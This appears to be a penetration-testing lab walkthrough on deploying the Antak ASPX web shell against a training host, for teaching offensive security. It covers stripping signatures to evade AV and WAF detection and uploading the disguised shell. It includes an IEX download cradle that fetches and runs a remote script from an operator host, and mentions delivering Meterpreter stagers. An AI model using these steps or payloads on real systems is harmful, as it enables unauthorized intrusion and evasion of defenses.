# Antak Webshell

**[Antak](https://github.com/samratashok/nishang/tree/master/Antak-WebShell)** is an ASP.NET web shell included within the **[Nishang](https://github.com/samratashok/nishang)** offensive PowerShell framework. Where most web shells provide a basic command execution interface, Antak uses `powershell.exe` as its backend interpreter, running every submitted command with `-noninteractive` and `-executionpolicy bypass` flags, which bypasses the default PowerShell execution policy restriction that would otherwise block unapproved scripts. The user interface is styled to resemble a native PowerShell console, making interaction familiar for operators already proficient with PowerShell post-exploitation.

## ASPX Explained

Active Server Pages Extended (ASPX) is the file type and extension used within [Microsoft's ASP.NET Framework](https://docs.microsoft.com/en-us/aspnet/overview). Web servers running ASP.NET process `.aspx` files server-side, executing the embedded .NET code and returning HTML output to the client. An ASPX web shell exploits this execution model by placing malicious .NET code in a file that the server will execute on request, producing command output in the browser rather than a rendered web page. IIS on Windows is the most common target for ASPX-based shells, though any server running ASP.NET will be affected.

## Working with Antak

Antak is pre-installed on Kali Linux and Parrot OS as part of the Nishang package:

```bash
ls /usr/share/nishang/Antak-WebShell

antak.aspx  Readme.md
```

Antak's key capabilities beyond basic command execution include:

- In-memory script execution, removing the need to write scripts to disk on the target
- Base64 encoding of commands via the "Encode and Execute" function, which helps bypass basic input filtering on web application firewalls
- File upload and download directly through the browser interface
- PowerShell one-liner execution for downloading and running remote scripts

Each command submitted through Antak spawns a new `powershell.exe` process on the target. This has an important operational implication: stateful commands such as `cd` do not persist between submissions. Changing directory in one command will not carry that state into the next command, as each runs in an isolated process context. Construct commands that are self-contained, or chain them using semicolons within a single submission.

## Preparing the Shell for Deployment

Copy the Antak file to a working directory before modifying it:

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

Two mandatory modifications are required before deployment:

Open the file and locate line 14. Set a username and password within the credential variables. Antak presents an authentication prompt when accessed in the browser; without credentials configured, the shell is accessible to anyone who discovers the URL during the engagement window, which represents both an operational security risk and a rules of engagement concern.

As with Laudanum, remove the ASCII art banner and all developer comments from the file before uploading. These elements are used as static signatures by AV engines, web application firewalls, and IDS solutions; their presence is a reliable detection trigger.

Rename the output file to something contextually plausible for the target environment. A filename such as `Upload.aspx` is neutral and unlikely to stand out in a directory listing or server log.

## Deployment and Shell Access

Upload the prepared file via the target application's file upload function. On the `status.inlanefreight.local` target used in this walkthrough, uploaded files are stored in the `\\files\` directory. Navigate to the shell using the server path disclosed by the upload response:

```
http://status.inlanefreight.local//files/Upload.aspx
```

The browser will present the Antak authentication prompt. Enter the credentials configured on line 14 of the file to gain access to the PowerShell console interface.

## Issuing Commands and Script Execution

With access confirmed, the shell accepts standard PowerShell commands directly in the prompt window:

```powershell
whoami
whoami /priv
systeminfo
Get-LocalUser
Get-LocalGroupMember Administrators
```

To execute a remote PowerShell script entirely in memory without writing it to disk on the target, use the `IEX` download cradle in the command box:

```powershell
IEX ((New-Object Net.WebClient).DownloadString('http://<OPERATOR_IP>/script.ps1')); Invoke-ScriptFunction
```

For larger scripts that exceed practical one-liner length, paste the full script body into the command box and use the "Encode and Execute" button. Antak Base64-encodes the content and passes it to PowerShell via the `-EncodedCommand` parameter, bypassing length restrictions and simple pattern-based filters. This execution path is also useful for delivering Meterpreter stagers or other callback payloads, effectively converting the web shell session into a fully interactive reverse shell or C2 beacon.
